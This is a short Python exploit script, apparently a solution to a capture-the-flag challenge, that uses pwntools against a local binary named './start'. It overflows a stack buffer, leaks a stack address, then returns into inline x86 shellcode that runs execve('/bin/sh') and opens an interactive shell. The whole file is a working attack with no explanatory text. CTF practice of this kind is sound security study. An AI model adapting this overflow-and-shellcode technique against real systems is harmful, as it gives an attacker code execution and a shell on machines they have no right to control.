#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

p = process('./start')

#gdb.attach(p)

payload = 20 * 'A' + p32(0x08048087)
p.recvuntil('CTF:')
p.send(payload)

offset = 0xfffe24c0 - 0xfffe24d4
addr = u32(p.recv(4)) - offset
info('addr = ' + hex(addr))
#raw_input('@')
sh = asm('''
	push 0x68732f
	push 0x6e69622f
	push esp
	pop ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 11
	int 0x80
''')
payload = 20 * 'A' + p32(addr) + sh
p.sendline(payload)

p.interactive()

